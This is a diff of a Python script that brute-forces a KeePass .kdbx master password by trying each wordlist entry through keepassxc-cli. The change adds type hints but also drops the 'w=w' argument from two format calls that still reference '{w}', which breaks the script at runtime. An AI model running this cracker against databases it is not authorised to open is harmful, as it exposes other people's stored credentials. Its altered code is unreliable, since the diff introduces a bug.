@@ -3,7 +3,7 @@ import subprocess
 import sys
 import os
 
-def trypass(db_path, passwd):
+def trypass(db_path: str, passwd: str) -> bool:
     try:
         result = subprocess.run(
             ["keepassxc-cli", "ls", db_path],
@@ -18,26 +18,26 @@ def trypass(db_path, passwd):
         print("[-] Error:", e)
         return False
     
-def Main(db_path, wl_path):
+def Main(db_path: str, wl_path: str) -> str | None:
     if not os.path.isfile(db_path) or not str(db_path).endswith(".kdbx"):
         print("[!] Invalid kdbx file:", db_path)
-        return
+        return None
     
     if not os.path.isfile(wl_path):
         print("[!] {} is not a file.".format(wl_path))
-        return
+        return None
     
-    full_db_path = os.path.realpath(db_path)
-    full_wl_path = os.path.realpath(wl_path)
-    w = len("[*] Wordlist:")
+    full_db_path: str = os.path.realpath(db_path)
+    full_wl_path: str = os.path.realpath(wl_path)
+    w: int = len("[*] Wordlist:")
     
-    print("{:<{w}} {}".format("[*] KDBX:", full_db_path, w=w))
-    print("{:<{w}} {}".format("[*] Wordlist:", full_wl_path, w=w))
+    print("{:<{w}} {}".format("[*] KDBX:", full_db_path))
+    print("{:<{w}} {}".format("[*] Wordlist:", full_wl_path))
     print("[*] Starting brute-force...")
     
     with open(wl_path, 'r', encoding='utf-8') as f:
         for i, line in enumerate(f, 1):
-            passwd = line.strip()
+            passwd: str = line.strip()
             if not passwd:
                 continue
             if trypass(db_path, passwd):
@@ -55,6 +55,6 @@ if __name__ == "__main__":
         print("Usage:", sys.argv[0], "[.kdbx] [wordlist]")
         sys.exit()
 
-    db_path = sys.argv[1]
-    wl_path = sys.argv[2]
+    db_path: str = sys.argv[1]
+    wl_path: str = sys.argv[2]
     Main(db_path, wl_path)
